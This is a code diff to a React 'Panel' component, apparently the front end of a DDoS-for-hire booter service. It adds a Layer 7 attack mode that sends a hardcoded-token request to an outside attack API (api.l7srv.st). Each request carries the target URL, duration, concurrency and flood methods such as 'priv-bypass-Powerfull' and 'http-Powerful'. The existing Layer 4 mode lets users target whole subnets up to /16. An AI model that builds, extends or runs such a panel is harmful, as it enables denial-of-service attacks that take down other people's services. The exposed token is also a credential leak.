@@ -78,7 +78,8 @@ export default function Panel() {
   const getLayerLabel = (task) => {
     const methodUpper = task.method.toUpperCase();
     let protocol = methodUpper;
-    if (methodUpper.includes('UDP')) protocol = 'UDP';
+    if (task.layer === 'L7') protocol = 'HTTP';
+    else if (methodUpper.includes('UDP')) protocol = 'UDP';
     else if (methodUpper.includes('TCP')) protocol = 'TCP';
     return `${task.layer} • ${protocol}`;
   };
@@ -114,6 +115,22 @@ export default function Panel() {
       } catch (err) {
         console.error("API Hit Error:", err);
         setApiError("Failed to connect to API or Network Error. Check target details.");
+        setIsAttacking(false);
+        return;
+      }
+    } else if (layer === 'L7') {
+      try {
+        setApiError(null);
+        const token = "8xU8xJvvT6nF16JOF5XNT8";
+        const reqMethodEl = document.getElementById('req-method-select');
+        const reqMethod = reqMethodEl ? reqMethodEl.value : 'GET';
+        // Format L7 API url
+        const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(target)}&port=80&time=${finalDuration}&method=${method}&concs=${finalConns}&reqmethod=${reqMethod}`;
+        
+        await fetch(apiUrl, { mode: 'no-cors' });
+      } catch (err) {
+        console.error("L7 API Hit Error:", err);
+        setApiError("Failed to connect to L7 API or Network Error.");
         setIsAttacking(false);
         return;
       }
@@ -216,114 +233,138 @@ export default function Panel() {
             {/* Layer Toggle */}
             <div>
               <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>ATTACK LAYER</label>
-              <div className="toggle-group" style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '4px' }}>
+              <div className="toggle-group" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '4px', gap: '4px' }}>
                 <button 
                   className={`toggle-btn ${layer === 'L4' ? 'active' : ''}`}
-                  onClick={() => hasPlan && setLayer('L4')}
+                  onClick={() => { if(hasPlan) { setLayer('L4'); setMethod(''); } }}
                   disabled={!hasPlan}
-                  style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600, width: '100%' }}
+                  style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600 }}
                 >
-                  LAYER 4 - UDP
+                  LAYER 4
+                </button>
+                <button 
+                  className={`toggle-btn ${layer === 'L7' ? 'active' : ''}`}
+                  onClick={() => { if(hasPlan) { setLayer('L7'); setMethod(''); } }}
+                  disabled={!hasPlan}
+                  style={{ borderRadius: '6px', padding: '8px 12px', fontWeight: 600 }}
+                >
+                  LAYER 7
                 </button>
               </div>
             </div>
 
             {/* Target Input */}
             <div>
-              <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>TARGET IP</label>
+              <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>{layer === 'L4' ? 'TARGET IP' : 'TARGET URL'}</label>
               <input 
                 type="text" 
                 value={target}
                 onChange={(e) => setTarget(e.target.value)}
-                placeholder="20.204.231.11" 
+                placeholder={layer === 'L4' ? "20.204.231.11" : "https://example.com"} 
                 disabled={!hasPlan}
-                style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px' }}
+                style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px', width: '100%', boxSizing: 'border-box' }}
               />
             </div>
 
             {/* Subnet and Port Grid */}
-            <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr', gap: '16px' }}>
-              <div>
-                <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>SUBNET</label>
-                <div style={{ position: 'relative' }}>
-                <div 
-                  onClick={() => hasPlan && setIsSubnetDropdownOpen(!isSubnetDropdownOpen)}
-                  style={{ 
-                    background: '#0a0a0a', 
-                    border: '1px solid var(--border-color)', 
-                    borderRadius: '12px', 
-                    padding: '10px 12px', 
-                    color: subnet ? '#fff' : 'var(--text-secondary)',
-                    cursor: hasPlan ? 'pointer' : 'not-allowed',
-                    display: 'flex',
-                    justifyContent: 'space-between',
-                    alignItems: 'center',
-                    userSelect: 'none',
-                    width: '100%'
-                  }}
-                >
-                  {subnet}
-                  <ChevronDown size={16} color="var(--text-secondary)" style={{ transform: isSubnetDropdownOpen ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }} />
-                </div>
-
-                {isSubnetDropdownOpen && (
-                  <>
+            <div style={{ display: 'grid', gridTemplateColumns: layer === 'L4' ? '1.5fr 1fr' : '1fr', gap: '16px' }}>
+              {layer === 'L4' ? (
+                <div>
+                  <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>SUBNET</label>
+                  <div style={{ position: 'relative' }}>
                     <div 
-                      style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, zIndex: 10 }}
-                      onClick={() => setIsSubnetDropdownOpen(false)}
-                    ></div>
-                    <div style={{
-                      position: 'absolute',
-                      top: '100%',
-                      left: 0,
-                      right: 0,
-                      marginTop: '4px',
-                      background: 'rgba(10, 10, 10, 0.95)',
-                      backdropFilter: 'blur(12px)',
-                      border: '1px solid rgba(255, 255, 255, 0.1)',
-                      borderRadius: '12px',
-                      overflowY: 'auto',
-                      maxHeight: '200px',
-                      zIndex: 20,
-                      boxShadow: '0 4px 20px rgba(0,0,0,0.5)'
-                    }}>
-                      {['/32 — Host (1)', '/24 — Subnet (256)', '/16 — Subnet (65536)'].map((s) => (
-                        <div 
-                          key={s}
-                          onClick={() => {
-                            setSubnet(s);
-                            setIsSubnetDropdownOpen(false);
-                          }}
-                          style={{
-                            padding: '10px 12px',
-                            color: '#fff',
-                            cursor: 'pointer',
-                            background: subnet === s ? 'rgba(255,255,255,0.05)' : 'transparent',
-                            borderBottom: '1px solid rgba(255,255,255,0.02)'
-                          }}
-                          onMouseEnter={(e) => { if(subnet !== s) e.currentTarget.style.background = 'rgba(255,255,255,0.02)' }}
-                          onMouseLeave={(e) => { if(subnet !== s) e.currentTarget.style.background = 'transparent' }}
-                        >
-                          {s}
-                        </div>
-                      ))}
+                      onClick={() => hasPlan && setIsSubnetDropdownOpen(!isSubnetDropdownOpen)}
+                      style={{ 
+                        background: '#0a0a0a', 
+                        border: '1px solid var(--border-color)', 
+                        borderRadius: '12px', 
+                        padding: '10px 12px', 
+                        color: subnet ? '#fff' : 'var(--text-secondary)',
+                        cursor: hasPlan ? 'pointer' : 'not-allowed',
+                        display: 'flex',
+                        justifyContent: 'space-between',
+                        alignItems: 'center',
+                        userSelect: 'none',
+                        width: '100%'
+                      }}
+                    >
+                      {subnet}
+                      <ChevronDown size={16} color="var(--text-secondary)" style={{ transform: isSubnetDropdownOpen ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }} />
                     </div>
-                  </>
-                )}
-              </div>
-            </div>
-            <div>
-                <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>PORT</label>
-                <input
-                  type="number" 
-                  value={port}
-                  onChange={(e) => setPort(e.target.value)}
-                  placeholder="80" 
-                  className="mono"
-                  disabled={!hasPlan}
-                  style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px' }}
-                />
-              </div>
+
+                    {isSubnetDropdownOpen && (
+                      <>
+                        <div 
+                          style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, zIndex: 10 }}
+                          onClick={() => setIsSubnetDropdownOpen(false)}
+                        ></div>
+                        <div style={{
+                          position: 'absolute',
+                          top: '100%',
+                          left: 0,
+                          right: 0,
+                          marginTop: '4px',
+                          background: 'rgba(10, 10, 10, 0.95)',
+                          backdropFilter: 'blur(12px)',
+                          border: '1px solid rgba(255, 255, 255, 0.1)',
+                          borderRadius: '12px',
+                          overflowY: 'auto',
+                          maxHeight: '200px',
+                          zIndex: 20,
+                          boxShadow: '0 4px 20px rgba(0,0,0,0.5)'
+                        }}>
+                          {['/32 — Host (1)', '/24 — Subnet (256)', '/16 — Subnet (65536)'].map((s) => (
+                            <div 
+                              key={s}
+                              onClick={() => {
+                                setSubnet(s);
+                                setIsSubnetDropdownOpen(false);
+                              }}
+                              style={{
+                                padding: '10px 12px',
+                                color: '#fff',
+                                cursor: 'pointer',
+                                background: subnet === s ? 'rgba(255,255,255,0.05)' : 'transparent',
+                                borderBottom: '1px solid rgba(255,255,255,0.02)'
+                              }}
+                              onMouseEnter={(e) => { if(subnet !== s) e.currentTarget.style.background = 'rgba(255,255,255,0.02)' }}
+                              onMouseLeave={(e) => { if(subnet !== s) e.currentTarget.style.background = 'transparent' }}
+                            >
+                              {s}
+                            </div>
+                          ))}
+                        </div>
+                      </>
+                    )}
+                  </div>
+                </div>
+              ) : (
+                <div>
+                  <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>REQUEST METHOD</label>
+                  <select 
+                    disabled={!hasPlan}
+                    style={{ background: '#000', color: '#fff', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px', width: '100%', outline: 'none' }}
+                    id="req-method-select"
+                  >
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                  </select>
+                </div>
+              )}
+              {layer === 'L4' && (
+                <div>
+                  <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 600, color: 'var(--text-secondary)', letterSpacing: '0.05em', marginBottom: '8px' }}>PORT</label>
+                  <input
+                    type="number" 
+                    value={port}
+                    onChange={(e) => setPort(e.target.value)}
+                    placeholder="80" 
+                    className="mono"
+                    disabled={!hasPlan}
+                    style={{ background: '#000', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '10px 12px', width: '100%', boxSizing: 'border-box' }}
+                  />
+                </div>
+              )}
             </div>
 
             {/* Duration Input */}
@@ -390,7 +431,7 @@ export default function Panel() {
                       zIndex: 20,
                       boxShadow: '0 4px 20px rgba(0,0,0,0.5)'
                     }}>
-                      {['BGMI-V2', 'BGMI'].map((m) => (
+                      {(layer === 'L4' ? ['BGMI-V2', 'BGMI'] : ['priv-flood', 'ultra-priv-flood', 'priv-bypass-Powerfull', 'http-Powerful', 'browser']).map((m) => (
                         <div 
                           key={m}
                           onClick={() => {
